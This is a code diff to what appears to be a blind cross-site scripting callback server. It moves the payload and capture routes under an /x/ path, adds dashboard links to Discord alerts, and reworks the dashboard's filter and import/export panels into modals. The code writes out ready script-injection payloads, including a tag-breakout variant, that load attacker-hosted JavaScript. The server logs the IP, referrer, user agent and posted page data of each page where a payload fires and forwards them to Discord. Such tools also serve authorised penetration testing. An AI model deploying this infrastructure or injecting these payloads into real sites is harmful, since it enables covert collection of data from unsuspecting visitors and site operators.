@@ -195,10 +195,10 @@ app.get("/i/:marker.gif", (req, res) => {
   res.send(Buffer.from("R0lGODlhAQABAPAAAP///wAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw==", "base64"));
 });
 
-app.get("*", (req, res) => {
+app.get("/x/*", (req, res) => {
   writeCallback({
     ip: req.ip,
-    marker: markerFromPath(req.path),
+    marker: markerFromPath(req.params[0]),
     pageUrl: "",
     referrer: cleanString(req.get("referer") || ""),
     userAgent: cleanString(req.get("user-agent") || ""),
@@ -213,13 +213,13 @@ app.get("*", (req, res) => {
     "X-Content-Type-Options": "nosniff"
   });
 
-  res.send(buildPayload(publicBaseUrl, req.path));
+  res.send(buildPayload(publicBaseUrl, req.params[0]));
 });
 
-app.post("*", captureRawBody, (req, res) => {
+app.post("/x/*", captureRawBody, (req, res) => {
   writeCallback({
     ip: req.ip,
-    marker: markerFromPath(req.path),
+    marker: markerFromPath(req.params[0]),
     pageUrl: "",
     referrer: cleanString(req.get("referer") || ""),
     userAgent: cleanString(req.get("user-agent") || ""),
@@ -238,7 +238,7 @@ app.use((_req, res) => {
 
 app.listen(PORT, () => {
   console.log(`Blind XSS server listening on http://localhost:${PORT}`);
-  console.log(`Example payload: <script src="${publicBaseUrl}/blind-xss"></script>`);
+  console.log(`Example payload: <script src="${publicBaseUrl}/x/blind-xss"></script>`);
 });
 
 function captureRawBody(req, res, next) {
@@ -437,6 +437,8 @@ function notifyDiscord(entry) {
   }
 
   const page = entry.pageUrl || entry.referrer || "Unknown page";
+  const hitId = entry.receivedAt ? entry.receivedAt.replace(/[^a-zA-Z0-9]/g, "-") : "latest";
+  const dashboardField = { name: "Open in dashboard", value: `${publicBaseUrl}/dashboard#hit=${hitId}`, inline: false };
   const baseFields = [
     { name: "Marker", value: truncateDiscord(entry.marker), inline: true },
     { name: "Source", value: truncateDiscord(entry.source), inline: true },
@@ -448,13 +450,13 @@ function notifyDiscord(entry) {
   const rawBody = String(entry.rawBody || "");
 
   if (!rawBody) {
-    sendDiscordEmbed(baseFields, entry.receivedAt, "New Blind XSS Hit");
+    sendDiscordEmbed([...baseFields, dashboardField], entry.receivedAt, "New Blind XSS Hit");
     return;
   }
 
   if (rawBody.length <= DISCORD_FIELD_LIMIT) {
     sendDiscordEmbed(
-      [...baseFields, { name: "Body", value: rawBody, inline: false }],
+      [...baseFields, { name: "Body", value: rawBody, inline: false }, dashboardField],
       entry.receivedAt,
       "New Blind XSS Hit"
     );
@@ -475,7 +477,8 @@ function notifyDiscord(entry) {
   sendDiscordEmbed(
     [
       { name: "Marker", value: truncateDiscord(entry.marker), inline: true },
-      { name: "Body (2/2)", value: truncateDiscord(secondHalf), inline: false }
+      { name: "Body (2/2)", value: truncateDiscord(secondHalf), inline: false },
+      dashboardField
     ],
     entry.receivedAt,
     "New Blind XSS Hit (continued)"
@@ -683,7 +686,7 @@ function buildLoginPage(hasError = false, message = "Invalid password.") {
 }
 
 function buildDashboard(baseUrl) {
-  const samplePayload = `<script src="${baseUrl}/blind-xss"></script>"/><script src="${baseUrl}/blind-xss1"></script>`;
+  const samplePayload = `<script src="${baseUrl}/x/blind-xss"></script>"/><script src="${baseUrl}/x/blind-xss1"></script>`;
 
   return `<!doctype html>
 <html lang="en">
@@ -880,6 +883,45 @@ function buildDashboard(baseUrl) {
       align-items: center;
     }
 
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      z-index: 2000;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-overlay.open { display: flex; }
+    .modal {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 10px;
+      width: min(520px, 95vw);
+      box-shadow: 0 24px 48px rgba(0,0,0,0.5);
+      overflow: hidden;
+    }
+    .modal-header {
+      padding: 14px 16px;
+      border-bottom: 1px solid var(--line);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .modal-header h2 { margin: 0; font-size: 14px; font-weight: 650; }
+    .modal-body { padding: 16px; display: grid; gap: 12px; }
+    .modal-close {
+      background: transparent;
+      border: 0;
+      color: var(--muted);
+      font-size: 20px;
+      line-height: 1;
+      min-height: auto;
+      padding: 2px 6px;
+      cursor: pointer;
+    }
+    .modal-close:hover { color: var(--text); border-color: transparent; }
+
     .groups {
       display: grid;
       gap: 10px;
@@ -1039,6 +1081,7 @@ function buildDashboard(baseUrl) {
       .filters { grid-template-columns: 1fr; }
       .payload-row { grid-template-columns: 1fr; }
       th:nth-child(4), td:nth-child(4), th:nth-child(5), td:nth-child(5) { display: none; }
+      th:nth-child(6), td:nth-child(6) { max-width: 160px; }
     }
   </style>
 </head>
@@ -1050,6 +1093,8 @@ function buildDashboard(baseUrl) {
     </div>
     <div class="header-actions">
       <span class="pill" id="last-refresh">Waiting for callbacks</span>
+      <button class="ghost" id="open-filters">⚙ Filter</button>
+      <button class="ghost" id="open-import">⬆ Import / Export</button>
       <form method="post" action="/logout">
         <button class="ghost" type="submit">Logout</button>
       </form>
@@ -1090,13 +1135,17 @@ function buildDashboard(baseUrl) {
       </div>
     </section>
 
-    <section class="split">
-      <div class="panel">
-        <div class="panel-header">
+    <!-- Filter Modal -->
+    <div class="modal-overlay" id="modal-filters">
+      <div class="modal">
+        <div class="modal-header">
           <h2>Filters</h2>
-          <button id="clear-filters">Clear</button>
+          <div style="display:flex;gap:8px;align-items:center">
+            <button id="clear-filters">Clear</button>
+            <button class="modal-close" id="close-filters">✕</button>
+          </div>
         </div>
-        <div class="panel-body filters">
+        <div class="modal-body filters">
           <input id="filter-page" placeholder="Filter page URL or site" list="page-suggestions">
           <datalist id="page-suggestions"></datalist>
           <input id="filter-ip" placeholder="Filter IP" list="ip-suggestions">
@@ -1105,19 +1154,25 @@ function buildDashboard(baseUrl) {
           <datalist id="marker-suggestions"></datalist>
         </div>
       </div>
+    </div>
 
-      <div class="panel">
-        <div class="panel-header">
+    <!-- Import / Export Modal -->
+    <div class="modal-overlay" id="modal-import">
+      <div class="modal">
+        <div class="modal-header">
           <h2>Import / Export</h2>
+          <button class="modal-close" id="close-import">✕</button>
+        </div>
+        <div class="modal-body">
           <button id="download-hits">Download hits</button>
+          <div class="import-row">
+            <input id="import-file" type="file" accept=".jsonl,.json,application/json,application/x-ndjson">
+            <button id="append-import">Add to logs</button>
+          </div>
+          <div id="import-preview" class="muted empty">No import file selected.</div>
         </div>
-        <div class="panel-body import-row">
-          <input id="import-file" type="file" accept=".jsonl,.json,application/json,application/x-ndjson">
-          <button id="append-import">Add to logs</button>
-        </div>
-        <div id="import-preview" class="muted empty">No import file selected.</div>
       </div>
-    </section>
+    </div>
 
     <section class="panel">
       <div class="panel-header">
@@ -1165,8 +1220,8 @@ function buildDashboard(baseUrl) {
 
     function payloadForMarker(marker) {
       const clean = marker.replace(/^\\/+/, "").trim() || "blind-xss";
-      return '<script src="' + baseUrl + '/' + clean + '"></' + 'script>"/><script src="' +
-        baseUrl + '/' + clean + '1"></' + 'script>';
+      return '<script src="' + baseUrl + '/x/' + clean + '"></' + 'script>"/><script src="' +
+        baseUrl + '/x/' + clean + '1"></' + 'script>';
     }
 
     function updatePayload() {
@@ -1213,6 +1268,17 @@ function buildDashboard(baseUrl) {
         closeMenus();
       }
     });
+
+    // Modal open/close
+    function openModal(id) { document.getElementById(id).classList.add("open"); }
+    function closeModal(id) { document.getElementById(id).classList.remove("open"); }
+    document.querySelector("#open-filters").addEventListener("click", () => openModal("modal-filters"));
+    document.querySelector("#close-filters").addEventListener("click", () => closeModal("modal-filters"));
+    document.querySelector("#modal-filters").addEventListener("click", (e) => { if (e.target === e.currentTarget) closeModal("modal-filters"); });
+    document.querySelector("#open-import").addEventListener("click", () => openModal("modal-import"));
+    document.querySelector("#close-import").addEventListener("click", () => closeModal("modal-import"));
+    document.querySelector("#modal-import").addEventListener("click", (e) => { if (e.target === e.currentTarget) closeModal("modal-import"); });
+    document.addEventListener("keydown", (e) => { if (e.key === "Escape") { closeModal("modal-filters"); closeModal("modal-import"); } });
 
     async function loadCallbacks() {
       const response = await fetch("/api/callbacks", { cache: "no-store" });
@@ -1351,16 +1417,19 @@ function buildDashboard(baseUrl) {
       detailsTitleEl.textContent = selected ? selected.label + " (" + selected.hits.length + " hits)" : "Hit Details";
 
       const rows = detailHits.map((item) => {
+        const pageDisplay = item.pageUrl || item.referrer || "";
+        const bodyDisplay = item.rawBody ? '<pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:12px;max-height:120px;overflow-y:auto">' + escapeHtml(item.rawBody) + '</pre>' : '<span class="muted">—</span>';
         return '<tr>' +
           '<td><span class="marker">' + escapeHtml(item.marker || "unknown") + '</span><br><span class="muted">' + escapeHtml(formatTime(item.receivedAt)) + '</span></td>' +
-          '<td>' + linkify(item.pageUrl || item.referrer) + '</td>' +
+          '<td>' + (pageDisplay ? linkify(pageDisplay) : '<span class="muted">—</span>') + '</td>' +
           '<td>' + escapeHtml(item.ip || "") + '</td>' +
           '<td>' + escapeHtml(item.userAgent || "") + '</td>' +
           '<td>' + escapeHtml(item.viewport || item.source || "") + '<br><span class="muted">' + escapeHtml(item.language || "") + '</span></td>' +
+          '<td>' + bodyDisplay + '</td>' +
         '</tr>';
       }).join("");
 
-      callbacksEl.innerHTML = '<table><thead><tr><th style="width: 180px;">Marker</th><th>Page URL</th><th style="width: 130px;">IP</th><th>User Agent</th><th style="width: 120px;">Client</th></tr></thead><tbody>' + rows + '</tbody></table>';
+      callbacksEl.innerHTML = '<table><thead><tr><th style="width: 180px;">Marker</th><th>Page URL</th><th style="width: 130px;">IP</th><th>User Agent</th><th style="width: 120px;">Client</th><th>Body</th></tr></thead><tbody>' + rows + '</tbody></table>';
     }
 
     function applyFilters(callbacks) {
